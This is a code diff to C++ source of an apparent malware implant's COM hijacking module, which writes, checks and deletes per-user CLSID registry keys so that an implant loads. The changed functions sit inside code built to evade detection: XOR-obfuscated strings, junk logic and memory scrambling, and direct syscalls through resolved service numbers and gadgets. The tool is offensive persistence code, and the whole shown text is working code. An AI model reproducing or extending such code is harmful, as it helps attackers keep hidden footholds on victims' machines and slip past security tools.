@@ -18,7 +18,7 @@ namespace {
     const wchar_t kBothEnc[] = { 'B'^0x4B, 'o'^0x1F, 't'^0x8C, 'h'^0x3E }; // Both
 }
 
-bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& clsid) {
+bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& clsid, const std::wstring& subkey) {
     evasion::JunkLogic::GenerateEntropy();
 
     std::wstring sid = utils::GetCurrentUserSid();
@@ -49,7 +49,7 @@ bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& c
 
     evasion::JunkLogic::ScrambleMemory();
 
-    std::wstring relativePath = utils::DecryptW(kClsidPathEnc, 23) + clsid + L"\\" + utils::DecryptW(kInprocEnc, 14);
+    std::wstring relativePath = utils::DecryptW(kClsidPathEnc, 23) + clsid + L"\\" + subkey;
     HANDLE hKey = NULL;
     status = (NTSTATUS)utils::Shared::NtCreateKeyRelative(hHkcu, relativePath, &hKey);
 
@@ -75,11 +75,11 @@ bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& c
     return false;
 }
 
-bool ComHijacker::Verify(const std::wstring& clsid) {
+bool ComHijacker::Verify(const std::wstring& clsid, const std::wstring& subkey) {
     std::wstring sid = utils::GetCurrentUserSid();
     if (sid.empty()) return false;
 
-    std::wstring fullPath = L"\\Registry\\User\\" + sid + L"\\" + utils::DecryptW(kClsidPathEnc, 23) + clsid + L"\\" + utils::DecryptW(kInprocEnc, 14);
+    std::wstring fullPath = L"\\Registry\\User\\" + sid + L"\\" + utils::DecryptW(kClsidPathEnc, 23) + clsid + L"\\" + subkey;
 
     auto& resolver = evasion::SyscallResolver::GetInstance();
     DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
@@ -102,7 +102,7 @@ bool ComHijacker::Verify(const std::wstring& clsid) {
     return false;
 }
 
-bool ComHijacker::Uninstall(const std::wstring& clsid) {
+bool ComHijacker::Uninstall(const std::wstring& clsid, const std::wstring& subkey) {
     std::wstring sid = utils::GetCurrentUserSid();
     if (sid.empty()) return false;
     std::wstring fullPath = L"\\Registry\\User\\" + sid + L"\\" + utils::DecryptW(kClsidPathEnc, 23) + clsid;
@@ -119,7 +119,7 @@ bool ComHijacker::Uninstall(const std::wstring& clsid) {
     HANDLE hKey = NULL;
     NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, resolver.GetSyscallGadget(), (UINT_PTR)&hKey, (UINT_PTR)KEY_ALL_ACCESS, (UINT_PTR)&objAttr, 0, 0, 0, 0, 0, 0, 0, 0);
     if (NT_SUCCESS(status)) {
-        std::wstring subPath = fullPath + L"\\" + utils::DecryptW(kInprocEnc, 14);
+        std::wstring subPath = fullPath + L"\\" + subkey;
         UNICODE_STRING uSubPath;
         uSubPath.Buffer = (PWSTR)subPath.c_str();
         uSubPath.Length = (USHORT)(subPath.length() * sizeof(wchar_t));
